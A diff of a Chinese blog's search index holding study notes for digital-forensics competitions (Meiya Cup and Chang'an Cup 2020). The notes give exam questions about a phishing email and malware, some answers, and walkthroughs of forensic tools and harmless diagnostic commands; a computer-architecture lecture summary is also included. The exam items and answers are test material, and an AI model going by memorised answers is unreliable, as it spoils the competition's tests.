+<p>C:<a href="mailto:&#x64;&#x61;&#110;&#105;&#101;&#x6c;&#x6c;&#x61;&#x77;&#52;&#x33;&#51;&#x34;&#x36;&#64;&#121;&#x61;&#104;&#x6f;&#111;&#46;&#99;&#x6f;&#109;">&#x64;&#x61;&#110;&#105;&#101;&#x6c;&#x6c;&#x61;&#x77;&#52;&#x33;&#51;&#x34;&#x36;&#64;&#121;&#x61;&#104;&#x6f;&#111;&#46;&#99;&#x6f;&#109;</a> </p>
+<p>D:<a href="mailto:&#x64;&#x61;&#x6e;&#105;&#101;&#x6c;&#x6c;&#97;&#x77;&#x34;&#x33;&#51;&#x34;&#x36;&#64;&#121;&#97;&#104;&#111;&#x6f;&#x2e;&#99;&#111;&#109;&#46;&#x68;&#107;">&#x64;&#x61;&#x6e;&#105;&#101;&#x6c;&#x6c;&#97;&#x77;&#x34;&#x33;&#51;&#x34;&#x36;&#64;&#121;&#97;&#104;&#111;&#x6f;&#x2e;&#99;&#111;&#109;&#46;&#x68;&#107;</a> </p>
+<p>E:<a href="mailto:&#100;&#97;&#x6e;&#x69;&#101;&#108;&#108;&#x61;&#119;&#52;&#x33;&#51;&#x34;&#54;&#64;&#x79;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#111;&#x6d;">&#100;&#97;&#x6e;&#x69;&#101;&#108;&#108;&#x61;&#119;&#52;&#x33;&#51;&#x34;&#54;&#64;&#x79;&#x6d;&#97;&#x69;&#108;&#x2e;&#99;&#111;&#x6d;</a>. </p>
 <p><strong>答案：A</strong></p>
 <p><img src="/2021/11/03/%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E4%BD%93%E8%B5%9B2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211104221341849.png" alt="image-20211104221341849"></p>
-<h3 id="该恶意软件感染源是甚么？"><a href="#该恶意软件感染源是甚么？" class="headerlink" title="该恶意软件感染源是甚么？"></a>该恶意软件感染源是甚么？</h3><p>A:”<a href="mailto:&#100;&#x61;&#110;&#x69;&#101;&#108;&#x6c;&#x61;&#119;&#x34;&#51;&#51;&#52;&#54;&#x40;&#x67;&#109;&#x61;&#105;&#108;&#x2e;&#99;&#x6f;&#x6d;">&#100;&#x61;&#110;&#x69;&#101;&#108;&#x6c;&#x61;&#119;&#x34;&#51;&#51;&#52;&#54;&#x40;&#x67;&#109;&#x61;&#105;&#108;&#x2e;&#99;&#x6f;&#x6d;</a> - Daniel_Gmail.pst, Paypal updated:New Account update needs to be noticed” </p>
-<p>B:”<a href="mailto:&#x64;&#x61;&#110;&#105;&#101;&#108;&#x6c;&#x61;&#x77;&#x34;&#51;&#51;&#x34;&#x36;&#64;&#x67;&#109;&#x61;&#105;&#108;&#x2e;&#x63;&#x6f;&#x6d;">&#x64;&#x61;&#110;&#105;&#101;&#108;&#x6c;&#x61;&#x77;&#x34;&#51;&#51;&#x34;&#x36;&#64;&#x67;&#109;&#x61;&#105;&#108;&#x2e;&#x63;&#x6f;&#x6d;</a> - Daniel_Gmails.pst, Paypal updated:New Account update needs to be noticed” </p>
-<p>C:”<a href="mailto:&#x64;&#97;&#110;&#x69;&#x65;&#108;&#108;&#x61;&#x77;&#x40;&#103;&#109;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;">&#x64;&#97;&#110;&#x69;&#x65;&#108;&#108;&#x61;&#x77;&#x40;&#103;&#109;&#x61;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;</a> - Daniel_Gmail.pst, Paypal updated:New Account update needs to be noticed” </p>
-<p>D:”<a href="mailto:&#100;&#x61;&#110;&#x69;&#101;&#x6c;&#x61;&#x77;&#52;&#51;&#51;&#52;&#54;&#x40;&#x67;&#109;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#x6d;">&#100;&#x61;&#110;&#x69;&#101;&#x6c;&#x61;&#x77;&#52;&#51;&#51;&#52;&#54;&#x40;&#x67;&#109;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a> - Daniel_Gmail.pst, Paypal updated:New Account update needs to be noticed” </p>
-<p>E:”<a href="mailto:&#x64;&#x61;&#110;&#x69;&#x65;&#x6c;&#x6c;&#x61;&#x77;&#x34;&#x33;&#x33;&#x34;&#x36;&#x40;&#x79;&#97;&#104;&#111;&#111;&#x2e;&#x63;&#x6f;&#109;">&#x64;&#x61;&#110;&#x69;&#x65;&#x6c;&#x6c;&#x61;&#x77;&#x34;&#x33;&#x33;&#x34;&#x36;&#x40;&#x79;&#97;&#104;&#111;&#111;&#x2e;&#x63;&#x6f;&#109;</a> - Daniel_Gmail.pst, Paypal updated:New Account update needs to be noticed”.</p>
+<h3 id="该恶意软件感染源是甚么？"><a href="#该恶意软件感染源是甚么？" class="headerlink" title="该恶意软件感染源是甚么？"></a>该恶意软件感染源是甚么？</h3><p>A:”<a href="mailto:&#100;&#97;&#x6e;&#105;&#x65;&#108;&#108;&#97;&#119;&#x34;&#51;&#x33;&#52;&#54;&#x40;&#x67;&#109;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#x6d;">&#100;&#97;&#x6e;&#105;&#x65;&#108;&#108;&#97;&#119;&#x34;&#51;&#x33;&#52;&#54;&#x40;&#x67;&#109;&#97;&#x69;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a> - Daniel_Gmail.pst, Paypal updated:New Account update needs to be noticed” </p>
+<p>B:”<a href="mailto:&#x64;&#x61;&#x6e;&#105;&#x65;&#108;&#x6c;&#97;&#119;&#52;&#x33;&#x33;&#x34;&#x36;&#64;&#103;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;">&#x64;&#x61;&#x6e;&#105;&#x65;&#108;&#x6c;&#97;&#119;&#52;&#x33;&#x33;&#x34;&#x36;&#64;&#103;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#111;&#x6d;</a> - Daniel_Gmails.pst, Paypal updated:New Account update needs to be noticed” </p>
+<p>C:”<a href="mailto:&#x64;&#97;&#x6e;&#x69;&#x65;&#108;&#108;&#x61;&#x77;&#64;&#103;&#x6d;&#x61;&#105;&#108;&#46;&#x63;&#x6f;&#109;">&#x64;&#97;&#x6e;&#x69;&#x65;&#108;&#108;&#x61;&#x77;&#64;&#103;&#x6d;&#x61;&#105;&#108;&#46;&#x63;&#x6f;&#109;</a> - Daniel_Gmail.pst, Paypal updated:New Account update needs to be noticed” </p>
+<p>D:”<a href="mailto:&#x64;&#x61;&#110;&#105;&#x65;&#108;&#x61;&#119;&#x34;&#51;&#51;&#52;&#54;&#x40;&#x67;&#109;&#97;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;">&#x64;&#x61;&#110;&#105;&#x65;&#108;&#x61;&#119;&#x34;&#51;&#51;&#52;&#54;&#x40;&#x67;&#109;&#97;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a> - Daniel_Gmail.pst, Paypal updated:New Account update needs to be noticed” </p>
+<p>E:”<a href="mailto:&#x64;&#97;&#110;&#105;&#x65;&#108;&#x6c;&#x61;&#119;&#x34;&#x33;&#51;&#52;&#x36;&#x40;&#x79;&#97;&#104;&#111;&#x6f;&#46;&#99;&#x6f;&#x6d;">&#x64;&#97;&#110;&#105;&#x65;&#108;&#x6c;&#x61;&#119;&#x34;&#x33;&#51;&#52;&#x36;&#x40;&#x79;&#97;&#104;&#111;&#x6f;&#46;&#99;&#x6f;&#x6d;</a> - Daniel_Gmail.pst, Paypal updated:New Account update needs to be noticed”.</p>
 <p>答案：</p>
 <h3 id="在Daniel的桌面上发现了甚么恶意软件？-某些-字符被刻意用-遮盖"><a href="#在Daniel的桌面上发现了甚么恶意软件？-某些-字符被刻意用-遮盖" class="headerlink" title="在Daniel的桌面上发现了甚么恶意软件？(某些 字符被刻意用*遮盖)"></a>在Daniel的桌面上发现了甚么恶意软件？(某些 字符被刻意用*遮盖)</h3><p><code>A:wi**ows.bat </code></p>
 <p><code>B:ootd-4.0.**2.0.exe </code></p>
@@ -2868,6 +2705,90 @@
 <h1 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h1><h2 id="EDG-NB-！！！"><a href="#EDG-NB-！！！" class="headerlink" title="EDG NB ！！！"></a>EDG NB ！！！</h2>]]></content>
       <tags>
         <tag>电子数据取证</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>计算机组成与结构体系</title>
+    <url>/2022/01/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B8%8E%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
+    <content><![CDATA[<h1 id="计算机组成与结构体系"><a href="#计算机组成与结构体系" class="headerlink" title="计算机组成与结构体系"></a>计算机组成与结构体系</h1><h2 id="第一次课"><a href="#第一次课" class="headerlink" title="第一次课"></a>第一次课</h2><h3 id="教学大纲"><a href="#教学大纲" class="headerlink" title="教学大纲"></a>教学大纲</h3><p>本课程为计算机专业的专业基础课。课程主要讲述计算机系统主要部件的基本组成及其结构，通过指令的执行过程来掌握计算机系统的工作原理，内容包括：<strong>数据的编码表示、运算方法和运算器组成、指令系统、存储体系、控制器基本原理、系统总线及输入输出系统</strong>。</p>
+<h3 id="教学目录"><a href="#教学目录" class="headerlink" title="教学目录"></a>教学目录</h3><p><img src="/2022/01/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B8%8E%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20220113011814891.png" alt="image-20220113011814891"></p>
+<p>从1946年计算机诞生以来,大约每隔五年运算速度提高10倍,可靠性提高10倍,成本降低10倍,体积缩小10倍。</p>
+<h4 id="数字计算机的组成"><a href="#数字计算机的组成" class="headerlink" title="数字计算机的组成"></a>数字计算机的组成</h4><p><img src="/2022/01/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B8%8E%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20220113012552446.png" alt="image-20220113012552446"></p>
+<h5 id="运算器"><a href="#运算器" class="headerlink" title="运算器"></a>运算器</h5><p>主要功能是进行加、减、乘、除等算术运算,还可进行逻辑运算。</p>
+<p>在运算中，当数的位数越多时，计算的精度就越高。理论上讲，数的位数可以任意多。但是位数越多,所需的电子器件也越多</p>
+<h5 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h5><blockquote>
+<p>磁盘存储器和光盘存储器，称为外存储器。相对而言，半导体存储器称为内存储器，简称内存。</p>
+</blockquote>
+<p>一个半导体触发器由于有0和1两个状态，可以记忆一个二进制代码。</p>
+<p>一个数假定用16位二进制代码表示,那么就需要有16个触发器来保存这些代码。</p>
+<p>通常，在存储器中保存一个数的16个触发器，称为<strong>一个存储单元</strong>。存储器是由许多存储单元组成。</p>
+<p>每个存储单元的编号，称为<strong>地址</strong>。向存储器中存数或者从存储器中取数，都要按给定的地址来寻找所选的存储单元。</p>
+<p>存储器<strong>所有存储单元的总数</strong>成为存储器的存储容量。通常用单位“KB、MB”表示。</p>
+<h5 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h5><p>控制器的任务是从内存中取出解题步骤加以分析，然后执行某种操作。</p>
+<p>运算器只能完成加、减、乘、除四则运算及其他一些辅助操作。对于比较复杂的算题，计算机在运算前必须化成一步一步简单的加、减、乘、除等基本操作来做。</p>
+<p>每一个基本操作就叫做<strong>一条指令</strong>，而解算某一问题的一串指令序列，叫做该问题的<strong>计算程序</strong>，简称为程序。</p>
+<h5 id="输入输出设备"><a href="#输入输出设备" class="headerlink" title="输入输出设备"></a>输入输出设备</h5><p>计算机的输入/输出设备通常称为<strong>外围设备</strong>。</p>
+<p>这些外围设备有高速的也有低速的，有机电结构的，也有全电子式的。由于种类繁多且速度各异,因而它们不是直接地同高速工作的主机相连接,而是通过<strong>适配器部件</strong>与主机相连接。</p>
+<p>适配器的作用相当与一个转换器。它可以保证外围设备用计算机系统特性所要求的形式发送或接受信息。 </p>
+<h4 id="典型PC机构成"><a href="#典型PC机构成" class="headerlink" title="典型PC机构成"></a>典型PC机构成</h4><p><img src="/2022/01/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B8%8E%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20220113013814708.png" alt="image-20220113013814708"></p>
+<h4 id="冯-诺依曼计算机"><a href="#冯-诺依曼计算机" class="headerlink" title="冯.诺依曼计算机"></a>冯.诺依曼计算机</h4><h5 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h5><p>将计算机要处理的问题用指令编成程序，并将程序存放在存储器中，在控制器的控制下，从存储器中逐条取出指令并执行，通过执行程序最终解决计算机问题。</p>
+<h5 id="基本特点"><a href="#基本特点" class="headerlink" title="基本特点"></a>基本特点</h5><ul>
+<li>计算机组成：运算器、存储器、控制器、输入设备和输出设备</li>
+<li>指令和数据以二进制形式表示，按地址访问存储</li>
+<li>指令=操作码+地址码</li>
+<li>指令编成程序</li>
+<li>在控制器控制下，指令被逐条（顺序）从存储器中取出来执行，产生控制流，在控制流驱动下完成指令的功能</li>
+<li>可由跳转或者设定的条件改变程序中指令的执行顺序</li>
+<li>以运算器为中心，输入输出设备通过运算器与存储器传送数据</li>
+</ul>
+<h5 id="硬件结构发展"><a href="#硬件结构发展" class="headerlink" title="硬件结构发展"></a>硬件结构发展</h5><ul>
+<li>不断扩充硬件及功能</li>
+<li>存储器分层</li>
+<li>总线结构</li>
+</ul>
+<h4 id="计算机软件"><a href="#计算机软件" class="headerlink" title="计算机软件"></a>计算机软件</h4><h5 id="系统软件"><a href="#系统软件" class="headerlink" title="系统软件"></a>系统软件</h5><p>系统软件用来<strong>简化程序设计</strong>，简化使用方法，<strong>提高计算机的使用效率</strong>，发挥和扩大计算机的功能及用途。</p>
+<ul>
+<li>各种服务性程序,如诊断程序排错程序练习程序等</li>
+<li>语言程序,如汇编程序编译程序解释程序</li>
+<li>操作系统</li>
+<li>通用程序及数据库管理系统</li>
+</ul>
+<h5 id="应用软件"><a href="#应用软件" class="headerlink" title="应用软件"></a>应用软件</h5><p>应用软件是用户利用计算机来<strong>解决某些问题所编制的程序</strong>,如工程设计程序、数据处理程序、自动控制程序、企业管理程序、情报检索程序、科学计算程序等等。随着计算机的广泛应用,这类程序的种类越来越多。</p>
+<h4 id="指令集体系结构（ISA）"><a href="#指令集体系结构（ISA）" class="headerlink" title="指令集体系结构（ISA）"></a>指令集体系结构（ISA）</h4><p>处理器支持的指令和指令的字节级编码称为指令集体系结构（Instruction-Set Architecture，ISA），是软件和硬件的分界面.</p>
+<h5 id="涵盖的方面"><a href="#涵盖的方面" class="headerlink" title="涵盖的方面"></a>涵盖的方面</h5><ul>
+<li>指令集<ul>
+<li>指令格式、操作种类以及对应的操作数规定</li>
+<li>数据类型</li>
+<li>寻址方式</li>
+</ul>
+</li>
+<li>软件可见的处理器状态<ul>
+<li>寄存器属性</li>
+<li>指令执行过程的控制方式</li>
+</ul>
+</li>
+<li>存储模型<ul>
+<li>主存组织</li>
+<li>字节次序</li>
+<li>存储保护</li>
+<li>虚拟存储器的管理方式</li>
+<li>输入输出接口的访问与管理</li>
+</ul>
+</li>
+<li>系统模型<ul>
+<li>处理器状态</li>
+<li>特权级别</li>
+<li>中断和异常的处理方式</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="Flynn分类法"><a href="#Flynn分类法" class="headerlink" title="Flynn分类法"></a>Flynn分类法</h2><p>数据流（DS）<br>指令流所使用的数据，包括输入数据、中间数据和结果。数据在处理单元（PU）中进行处理。<br>指令流（IS）<br>机器执行的指令序列，由存储器流入控制单元（CU）。<br>控制流（CS）<br>指令流进入CU，由CU产生一系列控制流（信号），在控制流的控制下完成指令的功能。</p>
+<p>单指令流单数据流SISD<br>Single Instruction Single Data<br>单指令流多数据流SIMD<br> Single Instruction Multiple Data<br>多指令流单数据流MISD<br>Multiple Instructions Single Data<br>多指令流多数据流MIMD<br>Multiple Instructions Multiple Data</p>
+<p><img src="/2022/01/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E4%B8%8E%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/image-20220421193526313.png" alt="image-20220421193526313"></p>
+]]></content>
+      <tags>
+        <tag>计科课程</tag>
       </tags>
   </entry>
   <entry>
@@ -3574,6 +3495,223 @@
 <h1 id="疑难杂症"><a href="#疑难杂症" class="headerlink" title="疑难杂症"></a>疑难杂症</h1><p>8、请找出该服务器的网站访问端口是什么？（ ）</p>
 <p>25、当我们想将网站重构好时，访问网站时，web 应用在其中承担什么样的工作？（ 需取证大师）</p>
 <p>69、嫌疑人成功连接至 192.168.184.128 服务器的时间为：（ ）</p>
+]]></content>
+      <tags>
+        <tag>电子数据取证</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>长安杯2020例题笔记</title>
+    <url>/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="SHA256相关："><a href="#SHA256相关：" class="headerlink" title="SHA256相关："></a>SHA256相关：</h1><h2 id="计算原始磁盘或镜像的SHA256值"><a href="#计算原始磁盘或镜像的SHA256值" class="headerlink" title="计算原始磁盘或镜像的SHA256值"></a>计算原始磁盘或镜像的SHA256值</h2><h3 id="对应例题："><a href="#对应例题：" class="headerlink" title="对应例题："></a>对应例题：</h3><p>10、检材 2 的原始磁盘 SHA256 值为（）</p>
+<p>30、检材 3 的原始磁盘 SHA256 值为（）</p>
+<p>42、检材 4 的原始磁盘 SHA256 值为（）</p>
+<p>2019长安杯    1、计算“检材 1.E01”镜像的 SHA256 值是多少（ ）</p>
+<h3 id="解题方法："><a href="#解题方法：" class="headerlink" title="解题方法："></a>解题方法：</h3><p>FMP -&gt; 证据文件 -&gt; 点击你所需要计算的磁盘并使其变蓝 -&gt; 右键哈希值计算</p>
+<h2 id="计算文件的SHA256值"><a href="#计算文件的SHA256值" class="headerlink" title="计算文件的SHA256值"></a>计算文件的SHA256值</h2><h3 id="对应例题：-1"><a href="#对应例题：-1" class="headerlink" title="对应例题："></a>对应例题：</h3><p>2019长安杯    59、计算“检材 4.E01”文件的 sha256 值（ ）</p>
+<h3 id="题解方法："><a href="#题解方法：" class="headerlink" title="题解方法："></a>题解方法：</h3><p>出题方给我们检材的时候同时会给出一个txt文件，里面记录着各个检材文件的sha256值，一般直接将其作为答案</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022163219449.png" alt="image-20211022163219449"></p>
+<h3 id="检验方法："><a href="#检验方法：" class="headerlink" title="检验方法："></a>检验方法：</h3><h5 id="为了保证出题方所给的材料没有损坏，可以在windows自带的PowerShell中输入"><a href="#为了保证出题方所给的材料没有损坏，可以在windows自带的PowerShell中输入" class="headerlink" title="为了保证出题方所给的材料没有损坏，可以在windows自带的PowerShell中输入"></a>为了保证出题方所给的材料没有损坏，可以在windows自带的PowerShell中输入</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-FileHash 文件路径 -Algorithm 校验的Hash值类型| Format-List</span><br></pre></td></tr></table></figure>
+
+<p>如果不带-Algorithm参数，也就是不指明验证的Hash值类型，那么默认验证的就是SHA256值。</p>
+<h1 id="操作系统方面"><a href="#操作系统方面" class="headerlink" title="操作系统方面"></a>操作系统方面</h1><h2 id="系统版本和内核版本"><a href="#系统版本和内核版本" class="headerlink" title="系统版本和内核版本"></a>系统版本和内核版本</h2><h3 id="对应例题：-2"><a href="#对应例题：-2" class="headerlink" title="对应例题："></a>对应例题：</h3><p>1、检材 1 的操作系统版本是（）</p>
+<p>31、检材 3 所在的计算机的操作系统版本是（）</p>
+<p>2、检材 1 中，操作系统的内核版本是（）</p>
+<p>11、检材 2 所在计算机的 OS 内部版本号是（）</p>
+<h3 id="linux系统解题方法："><a href="#linux系统解题方法：" class="headerlink" title="linux系统解题方法："></a>linux系统解题方法：</h3><p>使用火眼仿真系统，进入操作系统即可看到系统版本和内核版本（账号设置为root，密码自动调整为123456，可以完成登录）</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022170603576.png" alt="image-20211022170603576"></p>
+<p>第二行为内核版本，只需要输入    <strong>3.10.0</strong>    即可</p>
+<h5 id="在终端输入-cat-proc-version"><a href="#在终端输入-cat-proc-version" class="headerlink" title="在终端输入 cat /proc/version"></a>在终端输入 <code>cat /proc/version</code></h5><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022170931078.png" alt="image-20211022170931078"></p>
+<h5 id="在终端输入-uname-a"><a href="#在终端输入-uname-a" class="headerlink" title="在终端输入 uname -a"></a>在终端输入 <code>uname -a</code></h5><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022171017953.png" alt="image-20211022171017953"></p>
+<p>均可得到内核版本，其中的时间为系统版本发布时间</p>
+<h5 id="在终端输入-cat-etc-redhat-release-，这种方法只适合Redhat系的Linux"><a href="#在终端输入-cat-etc-redhat-release-，这种方法只适合Redhat系的Linux" class="headerlink" title="在终端输入    cat /etc/redhat-release    ，这种方法只适合Redhat系的Linux"></a>在终端输入    <code>cat /etc/redhat-release</code>    ，这种方法只适合Redhat系的Linux</h5><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022171538770.png" alt="image-20211022171538770"></p>
+<h3 id="windows系统题解方法："><a href="#windows系统题解方法：" class="headerlink" title="windows系统题解方法："></a>windows系统题解方法：</h3><p>使用美亚取证大师，取证结果 -&gt; 系统痕迹 -&gt; 系统信息 -&gt; 产品名称</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022172043461.png" alt="image-20211022172043461"></p>
+<p>可以直接获得系统版本的名称</p>
+<p>但是当前build无法直接作为系统OS版本的答案，内容不全，需要进入火眼仿真中查看</p>
+<p>开始 -&gt; 设置 -&gt;关于 ，可以找到操作系统版本</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022172740597.png" alt="image-20211022172740597"></p>
+<h2 id="计算机开关机时间"><a href="#计算机开关机时间" class="headerlink" title="计算机开关机时间"></a>计算机开关机时间</h2><h3 id="对应例题"><a href="#对应例题" class="headerlink" title="对应例题"></a>对应例题</h3><p>12、检材 2 所在计算机最后一次正常关机的时间为（）</p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>最简单的办法， 取证大师 -&gt; 案件概览 -&gt; 最后一次正常关机时间</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022201502698.png" alt="image-20211022201502698"></p>
+<h2 id="程序安装时间"><a href="#程序安装时间" class="headerlink" title="程序安装时间"></a>程序安装时间</h2><h3 id="对应例题-1"><a href="#对应例题-1" class="headerlink" title="对应例题"></a>对应例题</h3><p>13、检材 2 中，VMware 程序的安装时间为（）</p>
+<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>取证大师 -&gt; 取证结果 -&gt; 系统痕迹 -&gt; 安装软件 -&gt; 虚拟机软件 -&gt; 安装时间 </p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022201320946.png" alt="image-20211022201320946"></p>
+<h2 id="程序启动次数"><a href="#程序启动次数" class="headerlink" title="程序启动次数"></a>程序启动次数</h2><h3 id="对应例题-2"><a href="#对应例题-2" class="headerlink" title="对应例题"></a>对应例题</h3><p>14、检材 2 中，Vmware.exe 程序总计启动过（）</p>
+<h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>取证大师 -&gt; 取证结果 -&gt; 系统痕迹 -&gt; 应用程序运行痕迹 -&gt; VMWARE.EXE -&gt; 第六次运行时间，可知程序总共运行了6次</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022202227731.png" alt="image-20211022202227731"></p>
+<h1 id="磁盘逻辑卷方面"><a href="#磁盘逻辑卷方面" class="headerlink" title="磁盘逻辑卷方面"></a>磁盘逻辑卷方面</h1><h2 id="逻辑区块地址（仅对于此问题用火眼较好）："><a href="#逻辑区块地址（仅对于此问题用火眼较好）：" class="headerlink" title="逻辑区块地址（仅对于此问题用火眼较好）："></a>逻辑区块地址（仅对于此问题用火眼较好）：</h2><h3 id="对应例题：-3"><a href="#对应例题：-3" class="headerlink" title="对应例题："></a>对应例题：</h3><p>3、检材 1 中磁盘包含一个 LVM 逻辑卷，该 LVM 开始的逻辑区块地址（LBA）是（）</p>
+<h3 id="解题方法：-1"><a href="#解题方法：-1" class="headerlink" title="解题方法："></a>解题方法：</h3><h4 id="弘联火眼："><a href="#弘联火眼：" class="headerlink" title="弘联火眼："></a>弘联火眼：</h4><h5 id="在终端上输入-fdisk-l得到关于磁盘的信息，start即为逻辑区块地址"><a href="#在终端上输入-fdisk-l得到关于磁盘的信息，start即为逻辑区块地址" class="headerlink" title="在终端上输入 fdisk -l得到关于磁盘的信息，start即为逻辑区块地址"></a>在终端上输入 <code>fdisk -l</code>得到关于磁盘的信息，start即为逻辑区块地址</h5><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022184301739.png" alt="image-20211022184301739"></p>
+<h5 id="在终端上输入-lvdisplay可以获得逻辑卷的详情信息"><a href="#在终端上输入-lvdisplay可以获得逻辑卷的详情信息" class="headerlink" title="在终端上输入 lvdisplay可以获得逻辑卷的详情信息"></a>在终端上输入 <code>lvdisplay</code>可以获得逻辑卷的详情信息</h5><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022184533882.png" alt="image-20211022184533882"></p>
+<h4 id="美亚取证："><a href="#美亚取证：" class="headerlink" title="美亚取证："></a>美亚取证：</h4><p>找到对应磁盘的检材，查看摘要</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022184825104.png" alt="image-20211022184825104"></p>
+<p>但是这个内存物理地址的单位是字节<code>（Byte）</code>，而一个逻辑区块占用512位，所以要将这个值除以512。    <code>1074790400/512=2099200</code></p>
+<h1 id="docker相关"><a href="#docker相关" class="headerlink" title="docker相关"></a>docker相关</h1><h2 id="启动相关"><a href="#启动相关" class="headerlink" title="启动相关"></a>启动相关</h2><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022185911875.png" alt="image-20211022185911875"></p>
+<p>使用docker相关命令时，会遇到报错，原因时docker服务尚未启动</p>
+<h2 id="docker相关指令（详情见长安杯2019题解）"><a href="#docker相关指令（详情见长安杯2019题解）" class="headerlink" title="docker相关指令（详情见长安杯2019题解）"></a>docker相关指令（详情见长安杯2019题解）</h2><h5 id="在终端输入-service-docker-start即可启动docker，其他命令正常使用"><a href="#在终端输入-service-docker-start即可启动docker，其他命令正常使用" class="headerlink" title="在终端输入 service docker start即可启动docker，其他命令正常使用"></a>在终端输入 <code>service docker start</code>即可启动docker，其他命令正常使用</h5><h5 id="输入-docker-version-可以获得版本信息"><a href="#输入-docker-version-可以获得版本信息" class="headerlink" title="输入 docker version 可以获得版本信息"></a>输入 <code>docker version</code> 可以获得版本信息</h5><h5 id="输入-docker-images-查看本地所有的镜像"><a href="#输入-docker-images-查看本地所有的镜像" class="headerlink" title="输入 docker images 查看本地所有的镜像"></a>输入 <code>docker images</code> 查看本地所有的镜像</h5><h5 id="docker-ps-显示正在运行中的容器节点"><a href="#docker-ps-显示正在运行中的容器节点" class="headerlink" title="docker ps 显示正在运行中的容器节点"></a><code>docker ps</code> 显示正在运行中的容器节点</h5><h5 id="docker-ps-a-显示所有的容器节点"><a href="#docker-ps-a-显示所有的容器节点" class="headerlink" title="docker ps -a 显示所有的容器节点"></a><code>docker ps -a</code> 显示所有的容器节点</h5><h5 id="输入-docker-info-可以看到关于docker配置的相关信息"><a href="#输入-docker-info-可以看到关于docker配置的相关信息" class="headerlink" title="输入 docker info 可以看到关于docker配置的相关信息"></a>输入 <code>docker info</code> 可以看到关于docker配置的相关信息</h5><h5 id="输入docker-inspect-容器ID-可以查看该容器的详情信息"><a href="#输入docker-inspect-容器ID-可以查看该容器的详情信息" class="headerlink" title="输入docker inspect [容器ID] 可以查看该容器的详情信息"></a>输入<code>docker inspect [容器ID]</code> 可以查看该容器的详情信息</h5><h5 id="输入-stat-文件名-可以查看文件时间状态"><a href="#输入-stat-文件名-可以查看文件时间状态" class="headerlink" title="输入 stat [文件名] 